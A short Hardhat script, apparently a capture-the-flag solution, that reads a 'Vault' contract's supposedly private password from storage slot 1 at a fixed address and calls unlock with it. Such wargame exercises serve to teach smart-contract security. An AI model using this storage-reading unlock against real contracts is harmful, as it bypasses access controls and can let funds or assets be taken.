
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let provider = ethers.provider;
  const Vault = await hre.ethers.getContractFactory("Vault");
  const attack = await Vault.attach("0xCa39879eE9cE6e877fDe0363b78098Af0FaeCb3D");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  const priv = await provider.getStorageAt("0xCa39879eE9cE6e877fDe0363b78098Af0FaeCb3D", 1);
  console.log(priv)

  await attack.unlock(priv)
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
